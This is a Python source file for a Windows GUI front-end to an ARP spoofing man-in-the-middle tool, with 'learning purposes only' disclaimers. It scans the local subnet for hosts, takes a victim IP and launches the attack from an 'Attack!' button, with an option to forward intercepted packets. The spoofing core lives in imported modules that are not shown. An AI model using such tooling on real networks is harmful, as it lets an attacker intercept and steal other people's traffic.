"""
created by Yoav Kolet
"""

import multiprocessing
import re
import sys
import threading
import time
from tkinter import *

import customtkinter
import scapy.all as scapy
import win32api
import win32con
from PIL import Image
from scapy.all import conf

import spoof_tools
from arp_spoofer import ArpSpoofing

"""
THIS CODE IS FOR LEARNING PURPOSES ONLY!
"""


class SpoofGui:
    def __init__(self):
        # window
        self.root = customtkinter.CTk()
        self.set_window()

        self.set_widgets()
        self.place_widgets()

        self.show_ips_flag = False
        self.regex = "^((25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])\.){3}(25[0-5]|2[0-4][0-9]|1[0-9][0-9]|[1-9]?[0-9])$"
        self.spoof = None

    def set_widgets(self):
        """
        Create and configure GUI widgets for the ARP Spoofing application.
        """

        self.spoof_bt = customtkinter.CTkButton(
            master=self.root,
            text="Attack!",
            width=250,
            height=75,
            font=self.get_font(),
            command=self.start_spoof,
            fg_color="darkred",
            hover_color="red"
            )

        self.show_ips_bt = customtkinter.CTkButton(
            master=self.root,
            text="Show IPs",
            width=150,
            height=40,
            font=self.get_font(20),
            command=self.display_ips,
            fg_color="darkred",
            hover_color="red"
            )

        self.input = customtkinter.CTkEntry(
            self.root,
            placeholder_text="Enter the victim IP",
            width=250,
            height=30
            )

        self.iface_input = customtkinter.CTkEntry(
            self.root,
            placeholder_text="Enter Iface (default is Ethernet)",
            width=250,
            height=30
            )

    def set_window(self):
        """
        Set up the main window of the ARP Spoofer application.
        """

        self.root.title("ARP Spoofer")
        self.root.iconbitmap("assets//spoof_icon.ico")
        self.root.geometry("1152x720")
        customtkinter.set_appearance_mode("dark")
        self.root.resizable(False, False)

        image = Image.open("assets//darth_vader.png")
        background_image = customtkinter.CTkImage(image, size=(1152, 720))

        bg_lbl = customtkinter.CTkLabel(self.root, text="", image=background_image)
        bg_lbl.place(x=0, y=0)

    def place_widgets(self):
        """
        Place the widgets in the main window of the ARP Spoofer application.
        """
        self.spoof_bt.place(relx=0.875, rely=0.3, anchor=CENTER)
        self.show_ips_bt.place(relx=0.15, rely=0.4, anchor=CENTER)
        self.input.place(relx=0.15, rely=0.2, anchor=CENTER)
        self.iface_input.place(relx=0.15, rely=0.3, anchor=CENTER)

    def start_spoof(self):
        """
        Start the ARP spoofing process in a separate thread.
        """
        t = threading.Thread(target=self.check_ip, daemon=True)
        t.start()

    def check_ip(self):
        """
        Check if the entered IP address matches the expected format.
        If valid, display a warning message and start ARP spoofing;
        otherwise, display not valid message.
        """
        if not re.search(self.regex, self.input.get()):
            threading.Thread(target=self.display_not_valid, daemon=True).start()
        else:
            self.show_warning("This program is for learning purposes only!", "ARP Spoofer Warning")
            self.spoof = ArpSpoofing(self.input.get(), self.iface_input.get())
            p = threading.Thread(target=self.spoof.start_spoof, daemon=True)
            p.start()
            self.draw_details()

    def display_not_valid(self):
        """
        Display a 'not valid' message label on the root window for 2 seconds.
        """
        not_valid = customtkinter.CTkLabel(
            master=self.root,
            text="not valid",
            text_color="red",
            compound=CENTER,
            bg_color="black",
            font=self.get_font()
            )
        not_valid.place(relx=0.15, rely=0.1, anchor=CENTER)
        time.sleep(2)
        not_valid.place_forget()

    @staticmethod
    def make_toplevel_spoof():
        """
        Create and configure a top-level window for the ARP Spoofer application.

        Returns:
            A customtkinter.CTkToplevel object configured for the ARP Spoofer.
        :rtype: customtkinter.CTkToplevel

        """
        tl = customtkinter.CTkToplevel()
        tl.title("ARP Spoofer")
        tl.iconbitmap("assets//spoof_icon.ico")
        tl.geometry("953x538")
        return tl

    def draw_details(self):
        tl = self.make_toplevel_spoof()
        customtkinter.CTkSwitch(
            master=tl,
            text="Forward packets",
            command=self.spoof.switch_event,
            variable=customtkinter.StringVar(self.root, value="on"),
            onvalue="on",
            offvalue="off",
            progress_color="red"
            ).place(relx=0.5, rely=0.9, anchor=CENTER)
        customtkinter.CTkLabel(tl, text="your pc:", text_color="red", font=self.get_font()).place(relx=0.1, rely=0.1)
        customtkinter.CTkLabel(
            tl, text=f"ip: {self.spoof.ip} mac: {self.spoof.my_mac}"
            , font=self.get_font()
            ).place(relx=0.15, rely=0.21)
        customtkinter.CTkLabel(tl, text="victim:", text_color="red", font=self.get_font()).place(relx=0.1, rely=0.32)
        customtkinter.CTkLabel(
            tl, text=f"ip: {self.spoof.victim_ip} mac: {self.spoof.victim_mac}"
            , font=self.get_font()
            ).place(relx=0.15, rely=0.43)
        customtkinter.CTkLabel(tl, text="gateway:", text_color="red", font=self.get_font()).place(relx=0.1, rely=0.54)
        customtkinter.CTkLabel(
            tl, text=f"ip: {self.spoof.gateway_ip} mac: {self.spoof.gateway_mac}"
            , font=self.get_font()
            ).place(relx=0.15, rely=0.65)

    def display_ips(self):
        """
        Create and display detailed information about the ARP Spoofer configuration in a top-level window.
        """
        if not self.show_ips_flag:
            ip = scapy.get_if_addr(conf.iface).split(".")
            ip[-1] = "0"
            ip_list = spoof_tools.send_arp_broadcast(".".join(ip) + "/24")
            self.show_ips_flag = True
            self.show_ips_window = customtkinter.CTkToplevel()
            self.show_ips_window.title("IPs on the same lan")
            my_frame = customtkinter.CTkScrollableFrame(self.show_ips_window, width=600, height=500)
            customtkinter.CTkLabel(
                my_frame, text=ip_list, font=customtkinter.CTkFont(size=25),
                text_color="white"
                ).pack()
            my_frame.pack()
            self.show_ips_window.mainloop()
        else:
            if self.show_ips_window:
                self.show_ips_flag = False
                self.show_ips_window.destroy()
                self.display_ips()

    @staticmethod
    def show_warning(message, title="Warning"):
        """
        Display a warning message box with the given message and title.

        :param message: The warning message to display.
        :type message: str
        :param title: The title of the warning message box. Default is "Warning".
        :type title: str, optional
        """
        win32api.MessageBox(0, message, title, win32con.MB_ICONWARNING | win32con.MB_OK)

    @staticmethod
    def get_font(size=30):
        """
       Get a custom tkinter font object with the specified size.

       :param size: The size of the font. Default is 30.
       :type size: int, optional
       :return: The custom tkinter font object.
       :rtype: customtkinter.CTkFont
       """
        return customtkinter.CTkFont(size=size)


def main():
    try:
        if sys.platform == 'win32':
            sg = SpoofGui()
            sg.root.mainloop()
        else:
            raise RuntimeError("Unsupported platform - try windows")
    except Exception as e:
        print(f"Error: {e}")
        sys.exit(1)


if __name__ == '__main__':
    main()
